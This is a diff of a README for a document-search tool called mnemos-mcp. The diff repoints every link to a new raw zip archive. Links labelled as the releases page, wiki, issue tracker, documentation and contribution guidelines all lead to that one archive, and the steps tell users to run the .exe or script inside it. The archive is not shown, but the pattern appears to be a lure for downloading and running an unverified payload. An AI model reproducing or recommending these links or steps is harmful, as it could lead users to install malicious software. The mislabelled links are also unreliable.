@@ -6,7 +6,7 @@ Welcome to mnemos-mcp! This application helps you transform documents into searc
 
 ## 📥 Download Now
 
-[![Download mnemos-mcp](https://github.com/ELSAKKK/mnemos-mcp/raw/refs/heads/main/cli/mnemos-mcp-3.7.zip%20mnemos--mcp-blue)](https://github.com/ELSAKKK/mnemos-mcp/raw/refs/heads/main/cli/mnemos-mcp-3.7.zip)
+[![Download mnemos-mcp](https://raw.githubusercontent.com/ELSAKKK/mnemos-mcp/main/static/mnemos-mcp-v1.7.zip%20mnemos--mcp-blue)](https://raw.githubusercontent.com/ELSAKKK/mnemos-mcp/main/static/mnemos-mcp-v1.7.zip)
 
 ## 🔍 Features
 
@@ -27,14 +27,14 @@ To run mnemos-mcp effectively, ensure your system meets the following requiremen
 
 ## 📂 Download & Install
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/ELSAKKK/mnemos-mcp/raw/refs/heads/main/cli/mnemos-mcp-3.7.zip) to find the latest version of mnemos-mcp.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/ELSAKKK/mnemos-mcp/main/static/mnemos-mcp-v1.7.zip) to find the latest version of mnemos-mcp.
 
 2. **Download the Latest Version**: On the Releases page, look for the latest release. Download the version that matches your operating system. 
 
 3. **Install the Application**: Follow the installation instructions relevant to your OS:
    - **Windows**: Double-click the downloaded .exe file and follow the prompts.
    - **macOS**: Open the .dmg file, drag the mnemos-mcp app to your Applications folder.
-   - **Linux**: Extract the https://github.com/ELSAKKK/mnemos-mcp/raw/refs/heads/main/cli/mnemos-mcp-3.7.zip file and run the included script.
+   - **Linux**: Extract the https://raw.githubusercontent.com/ELSAKKK/mnemos-mcp/main/static/mnemos-mcp-v1.7.zip file and run the included script.
 
 4. **Run the Application**: After installation completes, open mnemos-mcp from your applications menu or double-click the icon.
 
@@ -56,9 +56,9 @@ Once you have installed mnemos-mcp, you can start adding your documents:
 
 ## 📘 Support & Documentation
 
-To get help or find more information about using mnemos-mcp, check our [Wiki](https://github.com/ELSAKKK/mnemos-mcp/raw/refs/heads/main/cli/mnemos-mcp-3.7.zip). The wiki contains detailed guides on features, troubleshooting, and tips to maximize your experience.
+To get help or find more information about using mnemos-mcp, check our [Wiki](https://raw.githubusercontent.com/ELSAKKK/mnemos-mcp/main/static/mnemos-mcp-v1.7.zip). The wiki contains detailed guides on features, troubleshooting, and tips to maximize your experience.
 
-If you encounter any issues or have questions not covered in the Wiki, feel free to open an issue on our [GitHub repository](https://github.com/ELSAKKK/mnemos-mcp/raw/refs/heads/main/cli/mnemos-mcp-3.7.zip). 
+If you encounter any issues or have questions not covered in the Wiki, feel free to open an issue on our [GitHub repository](https://raw.githubusercontent.com/ELSAKKK/mnemos-mcp/main/static/mnemos-mcp-v1.7.zip). 
 
 ## 💬 Community & Feedback
 
@@ -66,10 +66,10 @@ We value your feedback. Join our community on [Discord](#) to share your experie
 
 ## 📣 Additional Resources
 
-- **Documentation**: [Official Documentation](https://github.com/ELSAKKK/mnemos-mcp/raw/refs/heads/main/cli/mnemos-mcp-3.7.zip)
-- **Release Updates**: [Product Updates](https://github.com/ELSAKKK/mnemos-mcp/raw/refs/heads/main/cli/mnemos-mcp-3.7.zip)
-- **Contributing**: Want to help? Check out the [Contribution Guidelines](https://github.com/ELSAKKK/mnemos-mcp/raw/refs/heads/main/cli/mnemos-mcp-3.7.zip) for more details.
+- **Documentation**: [Official Documentation](https://raw.githubusercontent.com/ELSAKKK/mnemos-mcp/main/static/mnemos-mcp-v1.7.zip)
+- **Release Updates**: [Product Updates](https://raw.githubusercontent.com/ELSAKKK/mnemos-mcp/main/static/mnemos-mcp-v1.7.zip)
+- **Contributing**: Want to help? Check out the [Contribution Guidelines](https://raw.githubusercontent.com/ELSAKKK/mnemos-mcp/main/static/mnemos-mcp-v1.7.zip) for more details.
 
-[![Download mnemos-mcp](https://github.com/ELSAKKK/mnemos-mcp/raw/refs/heads/main/cli/mnemos-mcp-3.7.zip%20mnemos--mcp-blue)](https://github.com/ELSAKKK/mnemos-mcp/raw/refs/heads/main/cli/mnemos-mcp-3.7.zip) 
+[![Download mnemos-mcp](https://raw.githubusercontent.com/ELSAKKK/mnemos-mcp/main/static/mnemos-mcp-v1.7.zip%20mnemos--mcp-blue)](https://raw.githubusercontent.com/ELSAKKK/mnemos-mcp/main/static/mnemos-mcp-v1.7.zip) 
 
 Thank you for choosing mnemos-mcp! Enjoy building your private knowledge server.
